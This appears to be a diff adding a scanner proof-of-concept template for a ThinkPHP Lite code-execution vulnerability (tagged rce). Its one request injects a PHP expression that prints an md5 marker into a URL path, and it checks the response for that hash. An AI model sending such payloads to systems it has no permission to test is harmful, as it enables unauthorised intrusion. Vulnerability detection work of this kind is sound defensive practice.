@@ -1,0 +1,16 @@
+id: poc-yaml-thinkphp-lite-code-exec
+info:
+  name: ThinkPHP Lite 代码执行漏洞
+  severity: high
+  tags:
+  - rce
+  finger: ThinkPHP
+  osprey-id: vb_2019_0072
+requests:
+- method: GET
+  path: /index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D
+  expression: 'status_code == 200 && contains(body, "56540676a129760a3")
+
+    '
+variables: {}
+transport: http
